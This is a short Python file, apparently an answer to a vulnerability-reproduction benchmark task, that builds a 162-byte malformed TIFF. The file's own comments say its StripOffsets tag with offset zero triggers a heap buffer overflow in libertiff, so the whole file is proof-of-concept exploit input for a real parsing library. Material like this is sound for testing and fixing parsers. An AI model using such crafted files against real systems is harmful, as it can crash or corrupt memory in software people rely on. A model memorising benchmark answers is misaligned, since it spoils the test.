import struct
import os
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # TIFF header (little-endian)
        # Byte order: II (little endian), magic: 42, IFD offset: 8
        tiff_header = struct.pack('<2sHI', b'II', 42, 8)
        
        # Create a TIFF with an invalid offline tag (value offset = 0)
        # This triggers the heap buffer overflow in libertiff
        
        # IFD structure:
        # - Number of directory entries: 1
        # - Tag 273 (StripOffsets) with type=4 (LONG) and count=1
        # - Value offset = 0 (invalid)
        # - Next IFD offset = 0 (no more IFDs)
        
        # Pack the IFD
        ifd = struct.pack('<H', 1)  # Number of directory entries
        
        # Directory entry for StripOffsets (273)
        # Tag 273 = 0x0111, Type 4 = LONG, Count 1, Value/Offset = 0
        ifd += struct.pack('<HHII', 0x0111, 4, 1, 0)
        
        # Next IFD offset
        ifd += struct.pack('<I', 0)
        
        # Calculate total length needed for 162 bytes
        current_length = len(tiff_header) + len(ifd)
        padding_needed = 162 - current_length
        
        # Add padding to reach exactly 162 bytes
        padding = b'X' * padding_needed
        
        # Combine all parts
        poc = tiff_header + ifd + padding
        
        return poc